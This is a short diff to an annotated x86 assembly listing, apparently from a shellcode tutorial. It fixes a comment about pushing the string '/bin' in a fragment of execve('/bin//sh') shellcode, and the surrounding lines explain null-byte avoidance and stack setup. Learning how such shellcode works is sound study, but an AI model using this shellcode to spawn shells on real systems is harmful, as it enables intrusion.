@@ -63,7 +63,7 @@ push   0xb        ; the next two instructions set $eax to 0xb (syscall execve)
 pop    eax        ; (another trick to avoid null bytes)        
 push   ecx        ; push 0x00000000 to the stack (that would be the trailing null byte for our command string) 
 push   0x68732f2f ; push the string "//sh" to the stack (in reverse order) 
-push   0x6e69622f ; push the string "" to the stack (in reverse order)
+push   0x6e69622f ; push the string "/bin" to the stack (in reverse order)
 mov    ebx,esp    ; $ebx is execve pathname argument
 push   ecx        ; push 0x00000000 to the stack
 mov    edx,esp    ; $edx is execve envp argument (here it is NULL)
